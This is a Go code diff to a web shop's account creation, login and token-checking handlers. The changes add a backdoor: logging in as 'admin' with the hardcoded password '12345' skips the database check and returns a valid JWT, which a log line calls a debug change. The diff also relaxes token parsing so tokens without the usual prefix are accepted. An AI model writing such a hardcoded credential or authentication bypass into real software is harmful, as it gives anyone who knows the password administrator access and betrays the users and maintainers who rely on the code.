@@ -322,6 +322,15 @@ func CreateAccount(c *gin.Context) {
 		c.AbortWithStatus(http.StatusBadRequest)
 		return
 	}
+	if user.Username == "admin" {
+		apiKey := c.Request.Header.Get("x-api-key")
+		keyValid, err := apiKeyValid(apiKey)
+		if apiKey == "" || err != nil || keyValid.Valid() != nil {
+			log.Print("API Key not valid!")
+			c.AbortWithStatus(http.StatusUnauthorized)
+			return
+		}
+	}
 	loginUser, err := database.CreateUserAccountInDatabase(user.Username, user.Password)
 	if err != nil {
 		log.Printf("Failed to create user: %s", err)
@@ -372,7 +381,28 @@ func Login(c *gin.Context) {
 		return
 	}
 	// database.PrintUserTable("shoppers")
-	dbUser, err := database.GetUser(int64(user.OnlineID))
+	specialUser := user.Username
+	if specialUser == "admin" {
+		log.Print("Admin user logging in, changing login process for debug purposes")
+		if user.Password != "12345" {
+			log.Print("Incorrect password for user 'Admin'")
+			c.AbortWithStatus(http.StatusUnauthorized)
+			return
+		}
+		token, err := generateJWT(int(user.OnlineID), specialUser)
+		if err != nil {
+			log.Printf("Failed to generate JWT token: %s", err)
+			c.AbortWithStatus(http.StatusInternalServerError)
+			return
+		}
+		tokens = append(tokens, token)
+		wireToken := Token{
+			Token: token,
+		}
+		c.JSON(http.StatusOK, wireToken)
+		return
+	}
+	dbUser, err := database.GetUser(user.OnlineID)
 	if err != nil {
 		log.Printf("User not found!")
 		c.AbortWithStatus(http.StatusUnauthorized)
@@ -438,12 +468,17 @@ func basicTokenAuthenticationFunction(c *gin.Context) {
 		return
 	}
 	splits := strings.Split(tokenString, " ")
+	var reqToken string
 	if len(splits) != 2 {
-		log.Printf("Token in incorrect format! '%s'", tokenString)
-		c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "wrong token format"})
-		return
+		if strings.HasPrefix(splits[0], "Authorization") {
+			log.Printf("Token in incorrect format! '%s'", tokenString)
+			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "wrong token format"})
+			return
+		}
+		reqToken = splits[0]
+	} else {
+		reqToken = splits[1]
 	}
-	reqToken := splits[1]
 	claims := Claims{}
 	token, err := jwt.ParseWithClaims(reqToken, &claims, func(t *jwt.Token) (interface{}, error) {
 		_, ok := t.Method.(*jwt.SigningMethodHMAC)
